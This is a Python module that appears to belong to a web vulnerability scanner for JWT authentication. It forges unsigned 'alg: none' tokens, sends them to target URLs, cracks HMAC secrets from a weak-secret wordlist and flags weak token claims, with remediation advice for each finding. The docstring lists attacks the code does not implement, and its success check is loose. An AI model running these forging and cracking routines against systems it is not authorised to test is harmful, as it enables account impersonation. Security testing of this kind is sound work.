"""
JWT Scanner - Production Grade
Techniques: Algorithm confusion, None algorithm, Weak secret detection,
Missing claims, Sensitive data exposure, Key confusion attacks,
JWT in cookies/headers/body, Invalid signature acceptance
"""
import requests, base64, json, re, time, hmac, hashlib
from urllib.parse import urlparse

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/html, */*;q=0.8",
}

JWT_REGEX = re.compile(
    r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*'
)

WEAK_SECRETS = [
    "secret","password","123456","qwerty","admin","test","key",
    "jwt","token","mykey","private","secret_key","jwt_secret",
    "your-256-bit-secret","supersecret","changeme","default",
    "password123","abc123","1234567890","HS256","HS512",
    "secretsecret","mysecretkey","jwttoken","app_secret",
]

def b64url_decode(s):
    padding = 4 - len(s) % 4
    if padding != 4: s += "=" * padding
    try:
        return base64.urlsafe_b64decode(s)
    except:
        return b""

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3: return None, None, None
    try:
        header  = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts
    except:
        return None, None, None

def test_none_algorithm(token, url, session):
    """Test if server accepts JWT with alg:none (no signature)."""
    header, payload, parts = decode_jwt(token)
    if not header or not payload: return None

    # Create none-alg token
    fake_header = header.copy()
    fake_header["alg"] = "none"
    new_token = (
        b64url_encode(json.dumps(fake_header, separators=(',',':')).encode()) +
        "." +
        parts[1] +
        "."  # empty signature
    )

    # Try sending the forged token
    for header_name in ["Authorization", "X-Auth-Token", "X-JWT-Token", "Token"]:
        try:
            test_headers = HEADERS.copy()
            test_headers[header_name] = f"Bearer {new_token}"
            r = session.get(url, headers=test_headers, timeout=6, verify=False)
            # If we get 200 with similar response — none algorithm accepted
            if r.status_code == 200 and len(r.text) > 100:
                return {
                    "vuln_type": "JWT — Algorithm None Attack",
                    "url": url, "parameter": header_name,
                    "payload": new_token[:80]+"...", "severity": "Critical",
                    "description": (
                        f"Server accepts JWT with 'none' algorithm — signature not verified! "
                        f"Attacker can forge any token, impersonate any user. "
                        f"Sent via: {header_name}: Bearer <forged_token>"
                    ),
                    "recommendation": (
                        "1. Explicitly whitelist allowed algorithms — reject 'none'. "
                        "2. Use a JWT library with strict algorithm enforcement. "
                        "3. Never use algorithm from token header — hardcode server-side. "
                        "4. Implement token revocation list."
                    )
                }
        except: pass
    return None

def test_weak_secret(token, url):
    """Brute-force HMAC secret with common weak secrets."""
    header, payload, parts = decode_jwt(token)
    if not header: return None
    if header.get("alg","").upper() not in ["HS256","HS384","HS512"]: return None

    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_func = alg_map.get(header.get("alg","HS256").upper(), hashlib.sha256)

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    actual_sig = b64url_decode(parts[2])

    for secret in WEAK_SECRETS:
        try:
            expected = hmac.new(secret.encode(), signing_input, hash_func).digest()
            if hmac.compare_digest(expected, actual_sig):
                return {
                    "vuln_type": "JWT — Weak Secret Key",
                    "url": url, "parameter": "JWT signature",
                    "payload": f"secret='{secret}'", "severity": "Critical",
                    "description": (
                        f"JWT signed with weak secret: '{secret}'. "
                        f"Attacker can forge valid tokens for any user/role. "
                        f"Algorithm: {header.get('alg')}."
                    ),
                    "recommendation": (
                        "1. Use cryptographically random secret (min 256 bits). "
                        "2. Rotate secret immediately. "
                        "3. Invalidate all existing tokens. "
                        "4. Use RS256 (asymmetric) instead of HS256."
                    )
                }
        except: pass
    return None

def analyze_claims(header, payload, url):
    """Analyze JWT claims for security issues."""
    findings = []

    # 1. Missing expiration
    if "exp" not in payload:
        findings.append({
            "vuln_type": "JWT — No Expiration (exp) Claim",
            "url": url, "parameter": "JWT payload",
            "payload": "missing exp", "severity": "Medium",
            "description": "JWT has no expiration claim. Stolen tokens remain valid indefinitely.",
            "recommendation": "Set exp claim. Use short TTL (15-60 min). Implement refresh token rotation."
        })
    else:
        # Check if expiry is too long (> 30 days)
        import time as t_module
        exp = payload["exp"]
        iat = payload.get("iat", t_module.time())
        ttl_days = (exp - iat) / 86400
        if ttl_days > 30:
            findings.append({
                "vuln_type": "JWT — Excessive Expiration Time",
                "url": url, "parameter": "JWT exp",
                "payload": f"TTL={ttl_days:.0f} days", "severity": "Low",
                "description": f"JWT expires in {ttl_days:.0f} days — too long. Stolen tokens valid for extended period.",
                "recommendation": "Use short-lived access tokens (15-60 min) with refresh tokens."
            })

    # 2. Algorithm none
    if header.get("alg","").lower() in ["none","null",""]:
        findings.append({
            "vuln_type": "JWT — Algorithm None in Header",
            "url": url, "parameter": "JWT alg header",
            "payload": header.get("alg",""), "severity": "Critical",
            "description": "JWT header specifies 'none' algorithm — unsigned token. Any modification undetectable.",
            "recommendation": "Reject tokens with alg=none. Hardcode algorithm server-side."
        })

    # 3. Sensitive data in payload
    sensitive_keys = {
        "password":"password","passwd":"password","secret":"secret",
        "api_key":"API key","apikey":"API key","private_key":"private key",
        "ssn":"SSN","credit_card":"credit card","card_number":"card number",
        "cvv":"CVV","pin":"PIN",
    }
    for key, label in sensitive_keys.items():
        if key in str(payload).lower():
            findings.append({
                "vuln_type": "JWT — Sensitive Data in Payload",
                "url": url, "parameter": "JWT payload",
                "payload": key, "severity": "High",
                "description": f"JWT payload contains '{label}'. JWT is base64-encoded, NOT encrypted — anyone can decode and read it.",
                "recommendation": "Never store sensitive data in JWT payload. JWT payload is readable by anyone."
            })
            break

    # 4. Missing issuer
    if "iss" not in payload:
        findings.append({
            "vuln_type": "JWT — Missing Issuer (iss) Claim",
            "url": url, "parameter": "JWT iss",
            "payload": "missing iss", "severity": "Low",
            "description": "JWT missing issuer claim — server cannot verify token origin.",
            "recommendation": "Add 'iss' claim and validate server-side."
        })

    # 5. Privilege escalation check
    role = payload.get("role","") or payload.get("roles","") or payload.get("scope","")
    if role:
        findings.append({
            "vuln_type": "JWT — Role/Privilege in Payload",
            "url": url, "parameter": "JWT role",
            "payload": str(role)[:50], "severity": "Info",
            "description": f"JWT payload contains role/privilege data: '{str(role)[:50]}'. If token can be forged (weak secret or alg=none), attacker can escalate to admin.",
            "recommendation": "Store roles server-side. If in JWT, use asymmetric signing (RS256)."
        })

    return findings

def run_jwt_scan(crawl_data, timeout=8):
    findings, seen_tokens, seen_findings = [], set(), set()
    session = requests.Session()

    for page in crawl_data:
        url = page["url"]
        try:
            r = session.get(url, headers=HEADERS, timeout=timeout, verify=False)
        except: continue

        # Collect JWTs from multiple sources
        jwt_sources = []

        # 1. Response body
        for token in JWT_REGEX.findall(r.text):
            jwt_sources.append(("body", token))

        # 2. Cookies
        for cookie in r.cookies:
            if JWT_REGEX.match(cookie.value):
                jwt_sources.append((f"cookie:{cookie.name}", cookie.value))

        # 3. Response headers (Authorization, etc.)
        for h_name, h_val in r.headers.items():
            for token in JWT_REGEX.findall(h_val):
                jwt_sources.append((f"header:{h_name}", token))

        for source, token in jwt_sources:
            if token in seen_tokens: continue
            seen_tokens.add(token)

            header, payload, parts = decode_jwt(token)
            if not header or not payload: continue

            # Only analyze tokens with auth-related claims
            auth_claims = {"sub","user_id","uid","id","email","role","scope",
                          "iss","aud","username","user","account_id"}
            if not any(k in payload for k in auth_claims): continue

            # 1. Claim analysis (always run)
            for f in analyze_claims(header, payload, url):
                fkey = f"{url}:{f['vuln_type']}"
                if fkey not in seen_findings:
                    seen_findings.add(fkey)
                    findings.append(f)

            # 2. None algorithm attack
            none_result = test_none_algorithm(token, url, session)
            if none_result:
                fkey = f"{url}:none_alg"
                if fkey not in seen_findings:
                    seen_findings.add(fkey)
                    findings.append(none_result)

            # 3. Weak secret brute-force
            weak_result = test_weak_secret(token, url)
            if weak_result:
                fkey = f"{url}:weak_secret"
                if fkey not in seen_findings:
                    seen_findings.add(fkey)
                    findings.append(weak_result)

        time.sleep(0.1)

    return findings
